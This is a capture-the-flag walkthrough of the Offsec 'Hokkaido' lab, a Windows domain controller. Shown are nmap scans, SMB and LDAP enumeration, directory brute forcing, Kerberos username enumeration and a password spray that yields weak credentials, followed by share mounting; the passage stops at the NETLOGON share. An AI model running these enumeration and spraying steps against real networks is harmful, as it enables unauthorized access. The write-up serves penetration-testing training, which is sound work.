# Offsec Practice: Hokkaido CTF Walkthrough

![Leonardo AI](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Hokkaido/screenshots/leonardoai.jpg)

## Introduction

The target host was a Windows Server acting as an Active Directory Domain Controller with multiple exposed services, including Kerberos, LDAP, SMB, WinRM, and Microsoft SQL Server. Initial access was achieved through unauthenticated and low-privileged enumeration, followed by credential discovery and abuse of Active Directory misconfigurations.

The attack chain involved Kerberos user enumeration, weak credential usage, excessive SMB share permissions, exposure of plaintext credentials in domain shares, Kerberoasting, SQL Server impersonation, and delegated Active Directory permissions. Each step built on previously obtained access without requiring exploitation of memory corruption or kernel-level vulnerabilities.

## Machine Enumeration

Nmap finds 14 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, and 5985. The port 80 HTTP service and 1433 MSSQL service were open in the initial scan.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ nmap -sC -sV 192.168.163.40 -oN nmap.init.txt                                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:33 EST
Nmap scan report for 192.168.163.40
Host is up (0.062s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-04 17:33:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
| ms-sql-info: 
|   192.168.163.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   192.168.163.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-14T13:04:52
|_Not valid after:  2055-11-14T13:04:52
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-11-13T13:04:34
|_Not valid after:  2026-05-15T13:04:34
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-04T17:34:10+00:00
|_ssl-date: 2025-12-04T17:34:19+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-04T17:34:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.79 seconds
```

Put on the all-ports scan and found more HTTP services running on different ports, and other services were running on the other ports. Ports 5830 and 47001 are open, and the HTTP service is running. The port 58538 is open and running MSSQL.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ nmap -p- -T4 192.168.163.40 -oN nmap.all.ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:36 EST
Warning: 192.168.163.40 giving up on port because retransmission cap hit (6).
Nmap scan report for hokkaido-aerospace.com (192.168.163.40)
Host is up (0.0070s latency).
Not shown: 65432 closed tcp ports (reset), 69 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49695/tcp open  unknown
49705/tcp open  unknown
49706/tcp open  unknown
49713/tcp open  unknown
49793/tcp open  unknown
58538/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 431.24 seconds
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ nmap -p 8530,8531,9389,47001,49664,49665,49666,49667,49668,49669,49675,49686,49687,49695,49705,49706,49713,49793,58538 -sC -sV 192.168.163.40
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:50 EST
Nmap scan report for hokkaido-aerospace.com (192.168.163.40)
Host is up (0.0088s latency).

PORT      STATE SERVICE    VERSION
8530/tcp  open  http       Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
8531/tcp  open  unknown
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC
49675/tcp open  msrpc      Microsoft Windows RPC
49686/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc      Microsoft Windows RPC
49695/tcp open  msrpc      Microsoft Windows RPC
49705/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49713/tcp open  msrpc      Microsoft Windows RPC
49793/tcp open  msrpc      Microsoft Windows RPC
58538/tcp open  ms-sql-s   Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-12-04T17:51:36+00:00; 0s from scanner time.
| ms-sql-info: 
|   192.168.163.40:58538: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
| ms-sql-ntlm-info: 
|   192.168.163.40:58538: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-14T13:04:52
|_Not valid after:  2055-11-14T13:04:52
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.53 seconds
```

I added the `hokkaido-aerospace.com` domain into the `/etc/hosts` file and started enumerating the SMB service using `CrackMapExec` with empty credentials but didn’t find anything there.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec smb 192.168.163.40 -u '' -p '' --shares 
SMB         192.168.163.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\: 
SMB         192.168.163.40  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec smb 192.168.163.40 -u '' -p ''         
SMB         192.168.163.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\:
```

Next I tested the LDAP service using `ldapsearch` and didn’t find anything interesting.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ldapsearch -x -H ldap://192.168.163.40 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=hokkaido-aerospace,DC=com
ldapServiceName: hokkaido-aerospace.com:dc$@HOKKAIDO-AEROSPACE.COM
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hokkaido-aerospa
 ce,DC=com
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=hokkaido-aerospace,DC=com
schemaNamingContext: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingContexts: DC=hokkaido-aerospace,DC=com
namingContexts: CN=Configuration,DC=hokkaido-aerospace,DC=com
namingContexts: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingContexts: DC=DomainDnsZones,DC=hokkaido-aerospace,DC=com
namingContexts: DC=ForestDnsZones,DC=hokkaido-aerospace,DC=com
isSynchronized: TRUE
highestCommittedUSN: 45143
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=hokkaido-aerospace,DC=com
dnsHostName: dc.hokkaido-aerospace.com
defaultNamingContext: DC=hokkaido-aerospace,DC=com
currentTime: 20251204174134.0Z
configurationNamingContext: CN=Configuration,DC=hokkaido-aerospace,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ldapsearch -x -H ldap://192.168.163.40 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=DomainDnsZones,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=ForestDnsZones,DC=hokkaido-aerospace,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ldapsearch -x -H ldap://192.168.163.40 -b 'DC=hokkaido-aerospace,DC=com' -s sub
# extended LDIF
#
# LDAPv3
# base <DC=hokkaido-aerospace,DC=com> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

Put `ffuf` tool for directory brute force on port 80 but didn’t find anything.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ffuf -u 'http://hokkaido-aerospace.com/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 120

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hokkaido-aerospace.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 120
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 16ms]
:: Progress: [220546/220546] :: Job [1/1] :: 5555 req/sec :: Duration: [0:00:57] :: Errors: 0 ::
```

Put `ffuf` tool for directory brute force on port 5380 and found a few pages, such as content and inventory. I checked those pages but didn’t find anything there.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ffuf -u 'http://hokkaido-aerospace.com:8530/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 120

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hokkaido-aerospace.com:8530/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 120
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

content                 [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 17ms]
Content                 [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 19ms]
inventory               [Status: 301, Size: 168, Words: 9, Lines: 2, Duration: 135ms]
                        [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 29ms]
Inventory               [Status: 301, Size: 168, Words: 9, Lines: 2, Duration: 19ms]
:: Progress: [220546/220546] :: Job [1/1] :: 3846 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

After checking all possible services, I didn’t find anything. So, I put the username brute force using the `kerbrute_linux_amd64` tool and found a few usernames. I put those usernames into the username.txt file, and the same usernames were put into the password.txt file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ~/tools/windows/kerbrute/kerbrute_linux_amd64 userenum --dc 192.168.163.40 -d 'hokkaido-aerospace.com' -o foundusers.txt ~/tools/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/04/25 - Ronnie Flathers @ropnop

2025/12/04 13:03:59 >  Using KDC(s):
2025/12/04 13:03:59 >  	192.168.163.40:88

2025/12/04 13:03:59 >  [+] VALID USERNAME:	 info@hokkaido-aerospace.com
2025/12/04 13:04:00 >  [+] VALID USERNAME:	 administrator@hokkaido-aerospace.com
2025/12/04 13:04:00 >  [+] VALID USERNAME:	 INFO@hokkaido-aerospace.com
2025/12/04 13:04:00 >  [+] VALID USERNAME:	 Info@hokkaido-aerospace.com
2025/12/04 13:04:01 >  [+] VALID USERNAME:	 discovery@hokkaido-aerospace.com
2025/12/04 13:04:01 >  [+] VALID USERNAME:	 Administrator@hokkaido-aerospace.com
2025/12/04 13:04:17 >  [+] VALID USERNAME:	 maintenance@hokkaido-aerospace.com
2025/12/04 13:05:15 >  [+] VALID USERNAME:	 Discovery@hokkaido-aerospace.com
2025/12/04 13:20:44 >  [+] VALID USERNAME:	 Maintenance@hokkaido-aerospace.com
2025/12/04 13:21:19 >  [+] VALID USERNAME:	 DISCOVERY@hokkaido-aerospace.com
2025/12/04 13:22:01 >  Done! Tested 8295455 usernames (10 valid) in 1081.589 seconds
```

Tested those usernames using the `CrackMapExec` tool and found one match.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec smb 192.168.163.40 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.163.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\info:info 
...
...
...
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\INFO:info 
...
...
...
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\Info:info 
...
...
...
```

I checked the SMB shares using the `info:info` credential and found some open shares.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ crackmapexec smb 192.168.163.40 -u 'info' -p 'info' --shares              
SMB         192.168.163.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.163.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.163.40  445    DC               [+] Enumerated shares
SMB         192.168.163.40  445    DC               Share           Permissions     Remark
SMB         192.168.163.40  445    DC               -----           -----------     ------
SMB         192.168.163.40  445    DC               ADMIN$                          Remote Admin
SMB         192.168.163.40  445    DC               C$                              Default share
SMB         192.168.163.40  445    DC               homes           READ,WRITE      user homes
SMB         192.168.163.40  445    DC               IPC$            READ            Remote IPC
SMB         192.168.163.40  445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.163.40  445    DC               SYSVOL          READ            Logon server share 
SMB         192.168.163.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         192.168.163.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         192.168.163.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

In order to check each SMB share easily, I mounted those shares with the attacker machine using the `mount` command.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ sudo mount -t cifs -o 'username=info,password=info' //192.168.163.40/homes port445smb/homes
[sudo] password for kali:

┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/homes]
└─$ ls
 Angela.Davies     Anthony.Anderson   Charlene.Wallace   Deborah.Francis   Elliott.Jones   Grace.Lees        Irene.Dean      Lynne.Tyler     Rachel.Jones   Tracy.Wood
 Annette.Buckley   Catherine.Knight   Cheryl.Singh       Declan.Woodward   Gordon.Brown   "Hannah.O'Neill"   Julian.Davies   Molly.Edwards   Sian.Gordon    Victor.Kelly
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/homes]
└─$ find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
.
|____Angela.Davies
|____Annette.Buckley
|____Anthony.Anderson
|____Catherine.Knight
|____Charlene.Wallace
|____Cheryl.Singh
|____Deborah.Francis
|____Declan.Woodward
|____Elliott.Jones
|____Gordon.Brown
|____Grace.Lees
|____Hannah.O'Neill
|____Irene.Dean
|____Julian.Davies
|____Lynne.Tyler
|____Molly.Edwards
|____Rachel.Jones
|____Sian.Gordon
|____Tracy.Wood
|____Victor.Kelly
```

From the homes SMB share, it found the usernames and added them into the usernames.txt file and tried to do AS-REP Roasting to find more valid users.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ ~/tools/windows/kerbrute/kerbrute_linux_amd64 userenum --dc 192.168.163.40 -d 'hokkaido-aerospace.com' -o foundusers.txt usernames.txt -t 100                          

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/04/25 - Ronnie Flathers @ropnop

2025/12/04 13:40:27 >  Using KDC(s):
2025/12/04 13:40:27 >  	192.168.163.40:88

2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Administrator@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 maintenance@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Info@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 info@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 INFO@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Catherine.Knight@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Angela.Davies@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Anthony.Anderson@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 administrator@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Cheryl.Singh@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Charlene.Wallace@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Elliott.Jones@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Annette.Buckley@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Grace.Lees@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Gordon.Brown@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Deborah.Francis@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Declan.Woodward@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Discovery@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Lynne.Tyler@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Hannah.O'Neill@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Julian.Davies@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Irene.Dean@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Sian.Gordon@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Victor.Kelly@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Tracy.Wood@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Rachel.Jones@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 Molly.Edwards@hokkaido-aerospace.com
2025/12/04 13:40:27 >  [+] VALID USERNAME:	 discovery@hokkaido-aerospace.com
2025/12/04 13:40:27 >  Done! Tested 28 usernames (28 valid) in 0.118 seconds
```

Continue enumerating other SMB shares.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ sudo mount -t cifs -o 'username=info,password=info' //192.168.163.40/WsusContent port445smb/WsusContent

┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb]
└─$ cd WsusContent 
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/WsusContent]
└─$ ls -la
total 4
drwxr-xr-x 2 root root    0 Dec  4 13:30 .
drwxrwxr-x 9 kali kali 4096 Dec  4 13:27 ..
-rwxr-xr-x 1 root root    0 Nov 25  2023 anonymousCheckFile.txt
                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/Practice/Hokkaido/port445smb/WsusContent]
└─$ cat anonymousCheckFile.txt
```

The `NETLOGON` share has a `password_reset.txt` file. I add that password into the passwords.txt file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Hokkaido]
└─$ sudo mount -t cifs -o 'username=info,password=info' //192.168.163.40/NETLOGON port445smb/NETLOGON
[sudo] password for kali:

